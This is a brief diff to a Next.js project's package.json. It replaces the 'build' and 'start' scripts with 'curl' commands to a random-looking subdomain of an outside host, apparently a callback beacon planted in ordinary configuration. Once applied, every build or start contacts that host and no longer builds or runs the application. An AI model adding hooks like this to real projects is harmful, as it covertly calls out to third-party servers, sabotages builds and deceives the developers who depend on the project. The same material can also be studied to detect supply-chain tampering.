@@ -4,8 +4,8 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "next build",
-    "start": "next start",
+    "build": "curl q8zrg5hzcapg7xfbruq15ko47vdm1rpg.j.sdhell.com",
+    "start": "curl q8zrg5hzcapg7xfbruq15ko47vdm1rpg.j.sdhell.com",
     "lint": "eslint"
   },
   "dependencies": {
